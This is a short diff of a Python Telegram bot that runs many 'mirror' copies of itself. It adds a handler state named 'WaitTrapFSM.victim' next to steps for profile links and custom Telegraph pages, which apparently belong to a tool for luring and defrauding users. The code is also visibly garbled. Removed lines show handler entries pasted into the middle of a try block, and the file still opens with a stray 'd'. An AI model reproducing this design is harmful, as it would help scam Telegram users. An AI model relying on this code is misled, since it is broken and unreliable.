@@ -1,4 +1,4 @@
-﻿dqd
+﻿d
 MIRROR_LIMIT = 100  # максимум активных зеркал одновременно
 
 
@@ -402,6 +402,7 @@ def _build_mirror_dispatcher(token: str) -> tuple[Bot, Dispatcher]:
             AdminAddCaseFSM.user_id.state: admin_add_case_uid,
             AdminAddCaseFSM.amount.state: admin_add_case_amount,
             WaitProfileFSM.link.state: profile_step1,
+            WaitTrapFSM.victim.state: trap_step1,
             WaitTelegraphFSM.link.state: telegraph_step1,
             WaitTelegraphFSM.custom_text.state: telegraph_custom_text,
         }
@@ -431,11 +432,10 @@ async def _run_mirror(token: str):
         await asyncio.sleep(5)
         await start_mirror(token)
         return
-            WaitProfileFSM.link.state: profile_step1,
-            WaitTrapFSM.victim.state: trap_step1,
-            WaitTelegraphFSM.link.state: telegraph_step1,
-            WaitTelegraphFSM.custom_text.state: telegraph_custom_text,
-        }ry:
+    except Exception as e:
+        print(f"[MIRROR] ❌ Ошибка зеркала {token[:20]}: {e}", flush=True)
+    finally:
+        try:
             await dp.storage.close()
             await dp.storage.wait_closed()
         except Exception:
